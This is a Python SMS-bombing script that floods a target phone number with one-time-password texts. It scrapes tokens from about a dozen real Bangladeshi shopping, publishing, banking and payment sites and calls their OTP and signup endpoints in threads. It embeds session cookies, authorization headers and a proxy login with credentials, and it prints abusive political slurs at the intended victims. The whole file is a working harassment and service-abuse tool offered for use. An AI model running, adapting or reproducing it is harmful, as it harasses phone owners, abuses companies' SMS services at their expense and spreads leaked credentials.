import os
try:
    import mechanize
    import requests ,random, uuid
    from bs4 import BeautifulSoup
    from concurrent.futures import ThreadPoolExecutor
except ImportError:
    os.system("pip install requests mechanize bs4")
import mechanize
import requests ,random, uuid
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
def bomb(number):
    br = mechanize.Browser()
    br.open("https://www.isho.com/register")
    br.select_form(nr=1)
    br.form["phone"]=number
    br.form["email"]="ekramu@gmail.com"
    gt=br.submit()
    print(gt)
    headers={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding":"gzip, deflate, br",
    "Accept-Language":"en-US,en;q=0.9",
    "Cache-Control":"max-age=0",
    "Cookie":".AspNetCore.Session=CfDJ8Nn36%2F1msD5FhvyVv9UsCOjJ5UOlOFG6jRg%2Fsr6zDDD9pUE6dpOASMB6F%2BILWzsfwCF4WSiaWyXZcUF6wT5RoLXLJSfPpQp%2BpEiw%2Bi9yPaBS04WLJ%2FCknSbODTRGcchzBMbn3fDgUqdPWMXQcRklAzHzQ4bBci6mUVilnDNpmIX2; _gcl_au=1.1.1952976585.1706953925; _gid=GA1.3.426691066.1706953926; _clck=sgygmn%7C2%7Cfiy%7C0%7C1494; .AspNetCore.Antiforgery.B6RPubf2LMI=CfDJ8Nn36_1msD5FhvyVv9UsCOhttwMGsWnnBWtHB4AJunWT8GAyRTuJPavPGteTlBaQUc4kVl4pkR4JO9bD1X92rv6fyyhFcWlAmtms52eAYl__EPsW2ds4P4cx9kS-m5eWByu7ZgSKgLlsmWEvwg92B0U; _ga=GA1.3.236936856.1706953926; _ga_HGH2QBVYLE=GS1.1.1706953925.1.1.1706954481.54.0.0; _clsk=gc4yqj%7C1706956017147%7C6%7C1%7Cq.clarity.ms%2Fcollect",
    "Referer":"https://pbs.com.bd/publisher/6659/chilekotha-publication/1?fbclid=IwAR1KFn1Ov-nOl3l8QsqLhFe-VbbLV_o0uwwImbqLq22YM2ncW2DcGjzr0y4",
    "Sec-Ch-Ua":'"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    "Sec-Ch-Ua-Mobile":"?0",
    "Sec-Ch-Ua-Platform":"Windows",
    "Sec-Fetch-Dest":"document",
    "Sec-Fetch-Mode":"navigate",
    "Sec-Fetch-Site":"same-origin",
    "Sec-Fetch-User":"?1",
    "Upgrade-Insecure-Requests":"1",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"}
    soup = BeautifulSoup(requests.get("https://pbs.com.bd/login",headers=headers).text, 'html.parser')
    token = soup.find("input", {"name": "__RequestVerificationToken"}).get("value")
    x=requests.post("https://pbs.com.bd/login/?handler=UserGetOtp",json={"UserName":"","UserPassword":"","chkRememberPassword":"","MobileNo":number},headers={"X-Requested-With":"XMLHttpRequest",
    "Xsrf-Token":token,
    "Content-Type":"application/json; charset=UTF-8",
    "Cookie":".AspNetCore.Session=CfDJ8Nn36%2F1msD5FhvyVv9UsCOjJ5UOlOFG6jRg%2Fsr6zDDD9pUE6dpOASMB6F%2BILWzsfwCF4WSiaWyXZcUF6wT5RoLXLJSfPpQp%2BpEiw%2Bi9yPaBS04WLJ%2FCknSbODTRGcchzBMbn3fDgUqdPWMXQcRklAzHzQ4bBci6mUVilnDNpmIX2; _gcl_au=1.1.1952976585.1706953925; _gid=GA1.3.426691066.1706953926; _clck=sgygmn%7C2%7Cfiy%7C0%7C1494; .AspNetCore.Antiforgery.B6RPubf2LMI=CfDJ8Nn36_1msD5FhvyVv9UsCOhttwMGsWnnBWtHB4AJunWT8GAyRTuJPavPGteTlBaQUc4kVl4pkR4JO9bD1X92rv6fyyhFcWlAmtms52eAYl__EPsW2ds4P4cx9kS-m5eWByu7ZgSKgLlsmWEvwg92B0U; _ga=GA1.3.236936856.1706953926; _ga_HGH2QBVYLE=GS1.1.1706953925.1.1.1706954481.54.0.0; _clsk=gc4yqj%7C1706954483343%7C4%7C1%7Cq.clarity.ms%2Fcollect"})
    print(f"Attack on kuttar bacca >> "+number)
    url="https://shopapp.self-shopping.com/public/smsapiupdate?mobile="+number+"&msg=registration_otp&reason=setotp&uniqueCode="+requests.post("https://shopapp.self-shopping.com/public/otherspost?random=0.7632928168765943",json={"storeDeviceId":"0.otc4kup7889","uid":0},headers={"Host": "shopapp.self-shopping.com",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "okhttp/4.9.2",
    "Connection": "close"}).json()["string"]
    print(f"Attack on kuttar bacca >> "+number)
    (requests.get(url,headers={"Host": "shopapp.self-shopping.com",
    "Accept-Encoding": "gzip, deflate, br",
    "User-Agent": "okhttp/4.9.2",
    "Connection": "close"}).text)
    headers={"user-agent": "Dart/2.10 (dart:io)",
    "content-type": "application/json; charset=utf-8",
    "accept-encoding": "gzip",
    "content-length": "97",
    "authorization": "Otp bnVsbA==",
    "host": "ibanking.siblbd.com:31888"}
    x=requests.post("https://ibanking.siblbd.com:31888/cihno-service/api/v1/public/user/send/otp",json={"countryId":"19","mobileNumber":number,"purpose":"registration","id":8469,"text":"awzNC"},headers=headers).text
    print(f"Attack on kuttar bacca >> "+number)
    headers={
    "Cookie":"_gid=GA1.2.1989837071.1707060462; _ga=GA1.1.1414887131.1706950936; _ga_J8QV6VK3NM=GS1.1.1707060462.4.1.1707060466.0.0.0; _ga_DMQ3RC8V03=GS1.1.1707060461.4.1.1707060470.0.0.0; otp=eyJpdiI6IlpyNmxXNXBBdFNRalM3V3BQZHhraVE9PSIsInZhbHVlIjoiV2lhOE0wS1JEdTcwZEV5YnZtMDB2cGhvY1VhZFBzVnBHQnc1eGxqQzVmbURjdkRkTm1ER2tlcHcveE5CQno1UyIsIm1hYyI6ImQwNWE3NmFlOTE5ZTgzODdlMjRhMGJhNmU3N2I4Yjk5NDVmY2ZkY2EyYTMyZDlkNGQ3ZWFmOWI2NDQyMzExNDEifQ%3D%3D; XSRF-TOKEN=eyJpdiI6IklKdlZQWk5oQVhLZjlYcm1SZTBXY0E9PSIsInZhbHVlIjoiTTRBSmpyWFowQW0zNEh6UXZQK3FWaTVaNWNoanM1Y2pxYlNlai9uOVYra2h5WGxjQTNxbWhLa3FZSCtNNHVwenJjY1F0OVRpT2swY3JmSlpIMXh1ZTFLSDk5QUd3cWMvMm5CUmwwd3VoSjVIb0JtNUJzVUR1dFpJRDhTQk15bUEiLCJtYWMiOiJjNDM2NmQ2NzY0YTQ0MDk1OTI5ZGM1YjUzOThkYjJiZWQ3ZTA1MjVlYzhjMTVhZGYwZTFiYThjM2IyOTgyODQzIn0%3D; creativehub_session=eyJpdiI6IlpEUTZUSHhTTmtYbVp0c09VdTNzVmc9PSIsInZhbHVlIjoib1Z2N000NXd5OXVaSzFnbFVHWDlQYllJNk5UM3BhZ1RqL0dSZkxZTUxYOVpkWVpNOXlRMW5QdzhMeldwRDZ0RmZLR2t0aW1vOGFJbWs4dEtuY3RDekNXTnBGT2daKy9ZK1NIdGV1WkZQUjFQUXNqQktMMWd3SnRQVDRwQVRkZ3EiLCJtYWMiOiI3MmYzNDBkZjhjY2ViODhkOTc0OWYzNjNjNTVjMjZmYjAyNmVhMjk5Y2NkMWQxMzVhNTQxMzEyOWNlM2I2NDVmIn0%3D",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"}
    soup = BeautifulSoup(requests.get("https://rongpolli.com/login#registration",headers=headers).text, 'html.parser')
    token = soup.find("input", {"name": "_token"}).get("value")
    x=requests.post("https://rongpolli.com/login-otp",data=f"phone="+number+"&_token={token}&action=login",headers={"Accept":"application/json, text/javascript, */*; q=0.01",
    "Content-Length":"85",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "Cookie":"_gid=GA1.2.1989837071.1707060462; _gat_gtag_UA_203519668_1=1; XSRF-TOKEN=eyJpdiI6IlpiK25TN2h2dGlhTDFRMnBpbHZkN3c9PSIsInZhbHVlIjoiYy9zQnVDQ3hEaEtlQTZKUU9icWpmM3RTRGFLVWdFdnd6UFBzWW1hNzlnN254NnJuYVN4cVQwSG10QkhFRUpMMWJGMTNmeCtLdWJucFhHL0NyNFFidkRacnc2T0YyeWVZR2RLVzZPbU5Qa3NXWjAvR3VHeDdtZHNETmF3eGZKanciLCJtYWMiOiJlMmZkYWFjODBkNTQ2ODFkMTI1M2Y5N2Y4NGJhZTVkNzJmNTVmNmU5Y2I1NDU3YWM3YzRjYjYxMTI4MDJkZWJiIn0%3D; creativehub_session=eyJpdiI6InJpczM0dVcyMXZlQmdOM05OV2lJaXc9PSIsInZhbHVlIjoidFZhbjB0VDB1aW5XOU5MZ0RVQTdZTCtIVDNSWkdjbC9nYnhYNFJwc2pOSWlLcnJYTEVWMUxLbVAvcHVKUTNWYzVCNG5KMTNaYjlhVmZVWHRYenhmZk9YWkdobGN0TTIzcWNDTkp0Q1RnSmFmMHpmV2FoZDlEeUVYeWRpeURrelAiLCJtYWMiOiI2ZjMyOWUxMzM4OTc0OGFhNjU5YWI1YWUwNmFjYmFkNDdkYTI2MzVjZjE0NGMyNTQ3Mzk2NTdjYzljMWVlYTgxIn0%3D; _ga=GA1.1.1414887131.1706950936; _ga_J8QV6VK3NM=GS1.1.1707060462.4.1.1707060466.0.0.0; _ga_DMQ3RC8V03=GS1.1.1707060461.4.1.1707060470.0.0.0",
    "Origin":"https://rongpolli.com",
    "Referer":"https://rongpolli.com/login",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "X-Csrf-Token":token,
    "X-Requested-With":"XMLHttpRequest"})
    print(f"Attack on kuttar bacca >> "+number)
    soup = BeautifulSoup(requests.get("https://shopbasebd.com/store/registration",headers=headers).text, 'html.parser')
    token = soup.find("input", {"name": "_token"}).get("value")
    x=requests.post("https://shopbasebd.com/store/registration/sendOTP",data=f"number="+number+"&_token={token}",headers={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Cookie":"XSRF-TOKEN=eyJpdiI6IkRVa3k5WHdaSm9kZElNRGQvUFdQTFE9PSIsInZhbHVlIjoiczZUQW40WjFQTkszNWZZeWhISkhKT2IrQjNVWG1lVVVPODFmNURPbEhnSm01VHdmY2s5U05FZ2dDTGFlMEZ5eiIsIm1hYyI6ImQ0NDIyZjNmNDM1Mjc4MTQ4YzBjM2EwMzVjZDNmYjAyZjUwMjczYmE5N2NhZThiNDY2ZDcyYTAwOTVjMGY2YzUifQ%3D%3D; laravel_session=eyJpdiI6IlVXSndMYkJDNGFseHZhK2dOVEFucEE9PSIsInZhbHVlIjoiNkpyQTZZZjZmdStBMW4vc0x6TUh3ZFRhTy92WUh3Q09hS291TDJDQVJmV3UxT2JtelkwU3JuQ2hGSkFraHl2ViIsIm1hYyI6IjZjMWFkMGNjMmI0NzlkZGExYTYxOWRiYzc0MWEwYmVkYjc0NzdmYjY3NThiZjg4N2ExOTllYzU3ZDMxMTk5OTcifQ%3D%3D",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"})
    print(f"Attack on kuttar bacca >> "+number)
    headers={"Authorization": "Basic E8xlkWsSjZKBZ8yQ6VjaQIUM9tUfo/bPdrOy+BATiwc=",
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
    "Host": "test.dmoney.com.bd:3035",
    "Connection": "close",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Length": "20"}
    token=requests.post("https://test.dmoney.com.bd:3035/Dmoney/Token",data="grant_type=password&",headers=headers).json()["access_token"]
    uuiDeviceRandom = str(uuid.uuid4().fields[-1])[:7]
    headers={"productCode": "DM",
    "Authorization": f"bearer {token}",
    "accept-language": "en",
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
    "Host": "test.dmoney.com.bd:3035",
    "Connection": "close",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Length": "423"}
    json={"mobileNumber":number,"operatorId":"1","deviceName":"samsung SM-G965N Android 7.1.2","deviceNumber":f"9713aadd8{uuiDeviceRandom}","hardwareSignature":"544aed4fbc3ec3d4f7b55c1ded63f04a3c2dbbc8d5bad5f0d391e70aa7acf15f544b797f529fedfc62025053ba4e64ae639627a97cf24e049fe4307f7b9f01ae","mobileAppVersion":"3.0.6","mobileAppVersionCode":63,"productCode":"DM","requestId":"8414F7C27DFC5BBA","sessionStatusNeeded":0,"sessionToken":""}
    print(f"Attack on kuttar bacca >> "+number)
    (requests.post("https://test.dmoney.com.bd:3035/DmoneyPlatform/um_customer_create_step_init",json=json,headers=headers).text)
    headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Cookie": "digits_countrycode=880; _gid=GA1.2.1053744491.1707122834; PHPSESSID=f7d3d8556b99b1f5d50e3f8d5b728c9b; _ga_24576DYQHJ=GS1.1.1707125339.2.1.1707125339.0.0.0; _ga=GA1.1.1260333727.1707122834",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    }
    soup = BeautifulSoup(requests.get("https://www.texmartonline.com/n-my-account/",headers=headers).text, 'html.parser')
    token = soup.find("input", {"name": "dig_nounce"}).get("value")
    x=requests.post("https://www.texmartonline.com/wp-admin/admin-ajax.php",data=f"action=digits_check_mob&countrycode=%2B880&mobileNo={number[1:]}&csrf={token}&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=1731-479241&dig_otp=&dig_nounce=70e600a3b6",headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Cookie": "digits_countrycode=880; _gid=GA1.2.1053744491.1707122834; PHPSESSID=f7d3d8556b99b1f5d50e3f8d5b728c9b; _ga_24576DYQHJ=GS1.1.1707125339.2.1.1707125339.0.0.0; _ga=GA1.1.1260333727.1707122834",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    })
    print(f"Attack on kuttar bacca >> "+number)
    def randomChar():
        x=""
        for i in range(10):
            x=x+chr(random.randint(ord('a'), ord('z')))
        return x
    res =requests.post("https://api.reserveitbd.com/api/signup",json={"email":f"{randomChar()}@gmail.com","firstName":"Md ekramul","lastName":"hassan","password":"mao2116@#","phone":number,"type":"User","userName":randomChar()}).text
    if "Phone number already exist" in res:
        print(f"Attack on kuttar bacca >> "+number)
        (requests.put("https://api.reserveitbd.com/api/send-otp",json={"phone":number,"type":"User"}).text)
    else:
        print(f"Attack on kuttar bacca >> "+number)
        (requests.put("https://api.reserveitbd.com/api/send-otp",json={"phone":number,"type":"User"}).text)
    x = requests.get("https://www.moumachi.com.bd/otp-verify?phn="+number).status_code
    print(f"Attack on kuttar bacca >> "+number) 
    headers={
        "user-agent": "Dart/3.2 (dart:io)",
        "accept": "application/json",
        "accept-encoding": "gzip",
        "x-requested-with": "XMLHttpRequest",
        "content-length": "121",
        "host": "ecommerce.mamarhat.com",
    }
    x=requests.post("https://ecommerce.mamarhat.com/api/v1/resend-otp",files={"phone":number},headers=headers)
    print(f"Attack on kuttar bacca >> "+number)
    x = requests.post("https://api.lendorabd.com/Lendo/extsendsms/rapage/",json={"LendoPhoneTypeIn":"REGISTER_OR_LOGIN","LendoPhoneIn":"1996075545","LendoPAccessTokenaram":"","LendoPPhoneChannelaram":"google","LendoPDeviceIdaram":"eee83b49-ef94-4e48-b807-26cb4d555399","LendoPPhoneModelaram":"Redmi Note 7","LendoPPhoneOsaram":"7.1.1","LendoPPhonePlatformaram":"Android","LendoPPhoneAfIdaram":"1711128829591-42998420563458175454","LendoPAppPackagearam":"com.taka.dora","LendoPAppVersionaram":"1.0.1"},proxies={"https":"http://eafqzphut5zq6hv:q0i3c0nnb16nja1@rp.proxyscrape.com:6060"})
    print(f"Attack on kuttar bacca >> "+number)

def startFuck():
    print("Only For Chhatra League er chagol cor's !")
    numbers=input("Enter number : ")
    limit=1
    with ThreadPoolExecutor(max_workers=10) as pool:
        pool.map(bomb, [numbers]*int(limit))
        pool.shutdown(wait=True)
startFuck()
